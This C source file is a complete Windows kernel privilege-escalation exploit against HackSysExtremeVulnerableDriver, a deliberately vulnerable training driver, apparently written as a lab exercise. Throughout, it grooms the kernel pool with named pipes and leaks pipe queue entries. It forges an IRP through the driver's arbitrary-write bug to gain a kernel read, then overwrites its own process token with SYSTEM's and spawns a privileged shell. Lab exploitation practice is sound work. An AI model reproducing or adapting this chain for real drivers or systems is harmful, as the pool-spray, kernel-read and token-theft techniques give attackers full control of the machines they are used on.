#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define EPROCESS_UNIQUEPROCESSID_OFFSET 0x1d0
#define EPROCESS_ACTIVEPROCESSLINKS_OFFSET 0x1d8
#define EPROCESS_TOKEN_OFFSET 0x248
#define K_BASE 0xfffff807bda00000
#define IOCTL_LEAK_NX 0x22204F
#define IOCTL_ARBITRARY_WRITE 0x22200B
#define POOL_BUFFER_SIZE 504
#define PRIME_COUNT 10000
#define SPRAY_COUNT 10000
#define PIPE_DATA_SIZE 0x1C8
#define LEAK_SIZE 0x1000
#define DQE_HEADER_SIZE 0x30
#define HOLE_INTERVAL 4
#define INDEX_OFFSET (PIPE_DATA_SIZE - sizeof(int))
#define MAX_CANDIDATES 256

typedef struct {
  HANDLE write;
  HANDLE read;
} PIPE_PAIR;

typedef struct {
  SIZE_T hdrOffset;
  SIZE_T dataOffset;
  ULONG64 flink;
  ULONG64 blink;
  ULONG64 irp;
  ULONG32 entryType;
  ULONG32 dataSize;
  int pipeIdx;
} CANDIDATE;

typedef struct _WRITE_WHAT_WHERE {
  PVOID What;
  PVOID Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

static BOOL OpenPipePair(PIPE_PAIR *p) {
  p->write = CreateNamedPipeA(
      "\\\\.\\pipe\\hevd_spray", PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
      PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, (DWORD)-1,
      (DWORD)-1, 0, NULL);
  if (p->write == INVALID_HANDLE_VALUE) {
    p->read = INVALID_HANDLE_VALUE;
    return FALSE;
  }
  p->read = CreateFileA("\\\\.\\pipe\\hevd_spray", GENERIC_READ, 0, NULL,
                        OPEN_EXISTING, 0, NULL);
  if (p->read == INVALID_HANDLE_VALUE) {
    CloseHandle(p->write);
    p->write = INVALID_HANDLE_VALUE;
    return FALSE;
  }
  return TRUE;
}

static void ClosePipePair(PIPE_PAIR *p) {
  if (p->write != INVALID_HANDLE_VALUE) {
    CloseHandle(p->write);
    p->write = INVALID_HANDLE_VALUE;
  }
  if (p->read != INVALID_HANDLE_VALUE) {
    CloseHandle(p->read);
    p->read = INVALID_HANDLE_VALUE;
  }
}

static BOOL WritePipe(HANDLE hWrite, const void *data, DWORD len) {
  DWORD written;
  return WriteFile(hWrite, data, len, &written, NULL) && written == len;
}

static int CreatePipes(PIPE_PAIR *pipes, int count, const void *data,
                       DWORD len) {
  int live = 0;
  for (int i = 0; i < count; i++) {
    if (!OpenPipePair(&pipes[i]))
      continue;
    if (!WritePipe(pipes[i].write, data, len)) {
      ClosePipePair(&pipes[i]);
      continue;
    }
    live++;
  }
  return live;
}

static int SprayDoublePipes(PIPE_PAIR *pipes, int count, char *dataTemplate,
                            DWORD len) {
  int live = 0;
  for (int i = 0; i < count; i++) {
    if (!OpenPipePair(&pipes[i]))
      continue;
    *(int *)(dataTemplate + INDEX_OFFSET) = i;
    if (!WritePipe(pipes[i].write, dataTemplate, len)) {
      ClosePipePair(&pipes[i]);
      continue;
    }
    *(int *)(dataTemplate + INDEX_OFFSET) = i | 0x80000000;
    if (!WritePipe(pipes[i].write, dataTemplate, len)) {
      ClosePipePair(&pipes[i]);
      continue;
    }
    live++;
  }
  return live;
}

static void MakeHoles(PIPE_PAIR *pipes, int count, int interval) {
  for (int i = 0; i < count; i++)
    if (i % interval != 0)
      ClosePipePair(&pipes[i]);
}

static void FreeAllPipes(PIPE_PAIR *pipes, int count) {
  for (int i = 0; i < count; i++)
    ClosePipePair(&pipes[i]);
}

static BOOL TriggerLeak(HANDLE hHevd, PVOID outBuf, SIZE_T outLen) {
  DWORD returned;
  if (!DeviceIoControl(hHevd, IOCTL_LEAK_NX, &outLen, sizeof(outLen), outBuf,
                       (DWORD)outLen, &returned, NULL))
    return FALSE;
  for (int i = 0; i < POOL_BUFFER_SIZE; i++)
    if (((unsigned char *)outBuf)[i] != 0x41)
      return FALSE;
  return TRUE;
}

static BOOL ArbitraryWrite8(HANDLE hHevd, ULONG64 Where, ULONG64 Value) {
  WRITE_WHAT_WHERE www;
  www.What = (PVOID)&Value;
  www.Where = (PVOID)Where;
  DWORD br;
  return DeviceIoControl(hHevd, IOCTL_ARBITRARY_WRITE, &www, sizeof(www), NULL,
                         0, &br, NULL);
}

static BOOL KernelRead(HANDLE hHevd, HANDLE hPipeRead, ULONG64 DqeAddr,
                       ULONG64 TargetKernelAddr, PVOID OutBuf, ULONG ReadSize) {
  BOOL sizePatched = FALSE;
  BOOL ok = FALSE;
  DWORD got = 0;

  ULONG64 fakeIrp[0x20] = {0};
  fakeIrp[3] = TargetKernelAddr;

  ULONG64 FakeIrpUserVa = (ULONG64)fakeIrp;
  if (!ArbitraryWrite8(hHevd, DqeAddr + 0x10, FakeIrpUserVa))
    return FALSE;

  if (ReadSize > PIPE_DATA_SIZE) {
    if (!ArbitraryWrite8(hHevd, DqeAddr + 0x28, (ULONG64)ReadSize))
      goto cleanup;
    sizePatched = TRUE;
  }

  if (!ArbitraryWrite8(hHevd, DqeAddr + 0x20, 0x000001C800000001ULL))
    goto cleanup;

  ok = PeekNamedPipe(hPipeRead, OutBuf, ReadSize, &got, NULL, NULL);
  ok = ok && (got == ReadSize);

cleanup:
  ArbitraryWrite8(hHevd, DqeAddr + 0x20, 0x000001C800000000ULL);
  ArbitraryWrite8(hHevd, DqeAddr + 0x10, 0ULL);
  if (sizePatched) {
    ArbitraryWrite8(hHevd, DqeAddr + 0x28, PIPE_DATA_SIZE);
  }
  return ok;
}

static ULONG64 KernelRead64(HANDLE hHevd, HANDLE hPipeRead, ULONG64 DqeAddr,
                            ULONG64 Addr) {
  unsigned char buf[8] = {0};
  if (!KernelRead(hHevd, hPipeRead, DqeAddr, Addr, buf, 8))
    return 0;
  return *(ULONG64 *)buf;
}

static BOOL IsValidDqeHeader(const char *leakBuf, SIZE_T dataOffset) {
  if (dataOffset < DQE_HEADER_SIZE)
    return FALSE;
  SIZE_T hdr = dataOffset - DQE_HEADER_SIZE;
  ULONG64 irp = *(ULONG64 *)(leakBuf + hdr + 0x10);
  ULONG32 entryType = *(ULONG32 *)(leakBuf + hdr + 0x20);
  ULONG32 dataSize = *(ULONG32 *)(leakBuf + hdr + 0x28);
  return (irp == 0) && (entryType == 0) && (dataSize == PIPE_DATA_SIZE);
}

static BOOL ParseCandidate(const char *leakBuf, SIZE_T dataOffset,
                           CANDIDATE *c) {
  if (dataOffset < DQE_HEADER_SIZE)
    return FALSE;
  SIZE_T hdr = dataOffset - DQE_HEADER_SIZE;
  c->hdrOffset = hdr;
  c->dataOffset = dataOffset;
  c->flink = *(ULONG64 *)(leakBuf + hdr + 0x00);
  c->blink = *(ULONG64 *)(leakBuf + hdr + 0x08);
  c->irp = *(ULONG64 *)(leakBuf + hdr + 0x10);
  c->entryType = *(ULONG32 *)(leakBuf + hdr + 0x20);
  c->dataSize = *(ULONG32 *)(leakBuf + hdr + 0x28);
  c->pipeIdx = *(int *)(leakBuf + dataOffset + INDEX_OFFSET);
  return (c->entryType == 0) && (c->irp == 0) &&
         (c->dataSize == PIPE_DATA_SIZE) &&
         (c->flink >= 0xFFFF800000000000ULL &&
          c->flink <= 0xFFFFDFFFFFFFFFFFULL);
}

static int ScanLeak(const char *leakBuf, SIZE_T leakLen, const char *pattern,
                    SIZE_T patLen, CANDIDATE *out, int maxOut) {
  if (leakLen < patLen)
    return 0;
  int found = 0;
  for (SIZE_T i = 0x200; i <= leakLen - patLen; i++) {
    if (memcmp(leakBuf + i, pattern, patLen) != 0)
      continue;
    if (!IsValidDqeHeader(leakBuf, i))
      continue;
    if (found < maxOut && ParseCandidate(leakBuf, i, &out[found])) {
      found++;
      i += PIPE_DATA_SIZE - 1;
    }
    if (found >= maxOut)
      break;
  }
  return found;
}

static BOOL FindMultiEntryPair(CANDIDATE *cands, int count,
                               ULONG64 *outLeakBase, ULONG64 *outDqe1,
                               ULONG64 *outDqe2, ULONG64 *outQueueHead,
                               int *outPipeIdx) {
  for (int i = 0; i < count; i++) {
    for (int j = 0; j < count; j++) {
      if (i == j)
        continue;
      if (cands[i].blink != cands[j].flink)
        continue;

      int idx1 = cands[i].pipeIdx & 0x7FFFFFFF;
      int idx2 = cands[j].pipeIdx & 0x7FFFFFFF;
      int flag1 = cands[i].pipeIdx & 0x80000000;
      int flag2 = cands[j].pipeIdx & 0x80000000;

      if (idx1 != idx2)
        continue;
      if (flag1 == flag2)
        continue;

      ULONG64 dqe1Addr = cands[j].blink;
      ULONG64 dqe2Addr = cands[i].flink;
      ULONG64 base1 = dqe2Addr - cands[j].hdrOffset;
      ULONG64 base2 = dqe1Addr - cands[i].hdrOffset;

      if (base1 != base2 || base1 < 0xFFFF800000000000ULL)
        continue;

      *outLeakBase = base1;
      *outDqe1 = dqe1Addr;
      *outDqe2 = dqe2Addr;
      *outQueueHead = cands[i].blink;
      *outPipeIdx = idx1;
      return TRUE;
    }
  }
  return FALSE;
}

static ULONG64 FindPsInitialSystemProcess(ULONG64 KBase) {
  HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntoskrnl.exe",
                             GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    return 0;

  HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
  if (!hMap) {
    CloseHandle(hFile);
    return 0;
  }

  PVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
  if (!base) {
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 0;
  }

  ULONG64 result = 0;

  PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE)
    goto cleanup;

  PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)base + dos->e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE)
    goto cleanup;

  PIMAGE_OPTIONAL_HEADER64 opt = &nt->OptionalHeader;
  if (opt->Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    goto cleanup;

  PIMAGE_DATA_DIRECTORY expDir =
      &opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (!expDir->VirtualAddress || !expDir->Size)
    goto cleanup;

  PIMAGE_EXPORT_DIRECTORY exp =
      (PIMAGE_EXPORT_DIRECTORY)((BYTE *)base + expDir->VirtualAddress);

  DWORD *names = (DWORD *)((BYTE *)base + exp->AddressOfNames);
  WORD *ords = (WORD *)((BYTE *)base + exp->AddressOfNameOrdinals);
  DWORD *funcs = (DWORD *)((BYTE *)base + exp->AddressOfFunctions);

  for (DWORD i = 0; i < exp->NumberOfNames; i++) {
    char *name = (char *)((BYTE *)base + names[i]);
    if (strcmp(name, "PsInitialSystemProcess") != 0)
      continue;
    WORD ord = ords[i];
    result = KBase + funcs[ord];
    break;
  }

cleanup:
  UnmapViewOfFile(base);
  CloseHandle(hMap);
  CloseHandle(hFile);
  return result;
}

static ULONG64 FindOurEprocess(HANDLE hHevd, HANDLE hPipeRead, ULONG64 DqeAddr,
                               ULONG64 SystemEprocess, DWORD ourPid) {
  ULONG64 first = SystemEprocess;
  ULONG64 current = first;
  do {
    ULONG64 flink = KernelRead64(hHevd, hPipeRead, DqeAddr,
                                 current + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
    if (!flink)
      return 0;
    ULONG64 next = flink - EPROCESS_ACTIVEPROCESSLINKS_OFFSET;
    ULONG64 pid = KernelRead64(hHevd, hPipeRead, DqeAddr,
                               next + EPROCESS_UNIQUEPROCESSID_OFFSET);
    if (pid == (ULONG64)ourPid)
      return next;
    current = next;
  } while (current != first && current != 0);
  return 0;
}

static BOOL StealSystemToken(HANDLE hHevd, HANDLE hPipeRead, ULONG64 DqeAddr,
                             ULONG64 KBase) {
  printf("\n[*] --- Token Theft ---\n");

  ULONG64 psInitial = FindPsInitialSystemProcess(KBase);
  if (!psInitial) {
    printf("[-] Failed to resolve PsInitialSystemProcess\n");
    return FALSE;
  }
  printf("[+] PsInitialSystemProcess @ %016llX\n", psInitial);

  ULONG64 systemProc = KernelRead64(hHevd, hPipeRead, DqeAddr, psInitial);
  if (!systemProc || systemProc == 0x4242424242424242ULL) {
    printf("[-] Failed to read SYSTEM EPROCESS (got garbage)\n");
    return FALSE;
  }
  printf("[+] SYSTEM EPROCESS @ %016llX\n", systemProc);

  ULONG64 sysToken = KernelRead64(hHevd, hPipeRead, DqeAddr,
                                  systemProc + EPROCESS_TOKEN_OFFSET);
  if (!sysToken || sysToken == 0x4242424242424242ULL) {
    printf("[-] Failed to read SYSTEM token (got garbage)\n");
    return FALSE;
  }
  printf("[+] SYSTEM token: %016llX\n", sysToken);

  DWORD pid = GetCurrentProcessId();
  ULONG64 ourProc = FindOurEprocess(hHevd, hPipeRead, DqeAddr, systemProc, pid);
  if (!ourProc) {
    printf("[-] Failed to find our EPROCESS (PID=%lu)\n", pid);
    return FALSE;
  }
  printf("[+] Our EPROCESS @ %016llX\n", ourProc);

  ULONG64 ourToken =
      KernelRead64(hHevd, hPipeRead, DqeAddr, ourProc + EPROCESS_TOKEN_OFFSET);
  printf("[+] Our token:    %016llX\n", ourToken);

  ULONG64 newToken = (sysToken & ~0xF) | (ourToken & 0xF);
  printf("[*] Writing token %016llX -> EPROCESS+%03X\n", newToken,
         EPROCESS_TOKEN_OFFSET);

  if (!ArbitraryWrite8(hHevd, ourProc + EPROCESS_TOKEN_OFFSET, newToken)) {
    printf("[-] Token write failed\n");
    return FALSE;
  }
  printf("[+] Token stolen. Spawning shell...\n");
  return TRUE;
}

/* ------------------------------------------------------------------ */
/* main - with respray loop                                           */
/* ------------------------------------------------------------------ */
int main(void) {
  HANDLE hHevd = INVALID_HANDLE_VALUE;
  PIPE_PAIR *primePipes = NULL;
  PIPE_PAIR *sprayPipes = NULL;
  char *pipeData = NULL;
  char *leakBuf = NULL;
  CANDIDATE candidates[MAX_CANDIDATES] = {0};
  int exitCode = 1;

  primePipes = (PIPE_PAIR *)calloc(PRIME_COUNT, sizeof(PIPE_PAIR));
  sprayPipes = (PIPE_PAIR *)calloc(SPRAY_COUNT, sizeof(PIPE_PAIR));
  pipeData = (char *)malloc(PIPE_DATA_SIZE);
  leakBuf = (char *)malloc(LEAK_SIZE);
  if (!primePipes || !sprayPipes || !pipeData || !leakBuf) {
    printf("[-] Out of memory\n");
    goto cleanup;
  }

  memset(pipeData, 0x42, PIPE_DATA_SIZE);

  hHevd = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                      GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0,
                      NULL);
  if (hHevd == INVALID_HANDLE_VALUE) {
    printf("[-] Failed to open HEVD: %lu\n", GetLastError());
    goto cleanup;
  }

  ULONG64 leakBase = 0, dqe1 = 0, dqe2 = 0, queueHead = 0;
  int pipeIdx = -1;
  BOOL found = FALSE;
  int attempt = 0;

  while (!found && attempt < 10) {
    attempt++;
    printf("\n[*] === Attempt %d/10 ===\n", attempt);

    /* Free all previous pipes to reshuffle LFH */
    FreeAllPipes(primePipes, PRIME_COUNT);
    FreeAllPipes(sprayPipes, SPRAY_COUNT);
    memset(primePipes, 0, PRIME_COUNT * sizeof(PIPE_PAIR));
    memset(sprayPipes, 0, SPRAY_COUNT * sizeof(PIPE_PAIR));
    Sleep(500);

    /* ---- Prime ---- */
    printf("[*] Priming %d pipes...\n", PRIME_COUNT);
    int primeLive =
        CreatePipes(primePipes, PRIME_COUNT, pipeData, PIPE_DATA_SIZE);
    printf("[+] Primed %d pipes\n", primeLive);
    FreeAllPipes(primePipes, PRIME_COUNT);
    Sleep(400);

    /* ---- Spray (2 entries per pipe) ---- */
    printf("[*] Spraying %d pipes with 2 entries each...\n", SPRAY_COUNT);
    int sprayLive =
        SprayDoublePipes(sprayPipes, SPRAY_COUNT, pipeData, PIPE_DATA_SIZE);
    printf("[+] Sprayed %d live multi-entry pipes\n", sprayLive);
    if (sprayLive < 500) {
      printf("[-] Too few live pipes\n");
      continue;
    }

    memset(pipeData, 0x42, PIPE_DATA_SIZE);

    /* ---- Make holes ---- */
    printf("[*] Making holes (keeping 1 in %d)...\n", HOLE_INTERVAL);
    MakeHoles(sprayPipes, SPRAY_COUNT, HOLE_INTERVAL);
    Sleep(300);

    /* ---- Leak ---- */
    printf("[*] Triggering HEVD leak (0x%zX bytes)...\n", (SIZE_T)LEAK_SIZE);
    if (!TriggerLeak(hHevd, leakBuf, LEAK_SIZE)) {
      printf("[-] Leak failed\n");
      continue;
    }
    printf("[+] Leak OK\n");

    /* ---- Scan ---- */
    int candCount =
        ScanLeak(leakBuf, LEAK_SIZE, pipeData, 32, candidates, MAX_CANDIDATES);
    printf("[+] Found %d candidate(s)\n", candCount);
    if (candCount < 2) {
      printf("[-] Not enough candidates\n");
      continue;
    }

    /* ---- Resolve addresses ---- */
    if (!FindMultiEntryPair(candidates, candCount, &leakBase, &dqe1, &dqe2,
                            &queueHead, &pipeIdx)) {
      printf("[-] No multi-entry pair found\n");
      continue;
    }

    printf("\n[+] Resolved: DQE(head)=%016llX DQE(tail)=%016llX "
           "QueueHead=%016llX pipe=%d\n",
           dqe1, dqe2, queueHead, pipeIdx);

    if (pipeIdx < 0 || pipeIdx >= SPRAY_COUNT ||
        sprayPipes[pipeIdx].read == INVALID_HANDLE_VALUE) {
      printf("[-] Pipe %d was freed during hole creation.\n", pipeIdx);
      continue;
    }

    /* ---- Verify read primitive ---- */
    unsigned char verifyBuf[2] = {0};
    if (!KernelRead(hHevd, sprayPipes[pipeIdx].read, dqe1, K_BASE, verifyBuf,
                    2)) {
      printf("[-] Verification read failed, retrying...\n");
      continue;
    }
    if (verifyBuf[0] != 'M' || verifyBuf[1] != 'Z') {
      printf("[-] Verification garbage (got %02X %02X), retrying...\n",
             verifyBuf[0], verifyBuf[1]);
      continue;
    }
    printf("[+] Verification OK (MZ header)\n");
    found = TRUE;
  }

  if (!found) {
    printf("[-] Failed to find valid layout after 10 attempts\n");
    goto cleanup;
  }

  if (StealSystemToken(hHevd, sprayPipes[pipeIdx].read, dqe1, K_BASE)) {
    system("cmd.exe");
  }

  exitCode = 0;

cleanup:
  FreeAllPipes(primePipes, PRIME_COUNT);
  FreeAllPipes(sprayPipes, SPRAY_COUNT);
  if (hHevd != INVALID_HANDLE_VALUE)
    CloseHandle(hHevd);
  free(primePipes);
  free(sprayPipes);
  free(pipeData);
  free(leakBuf);
  return exitCode;
}
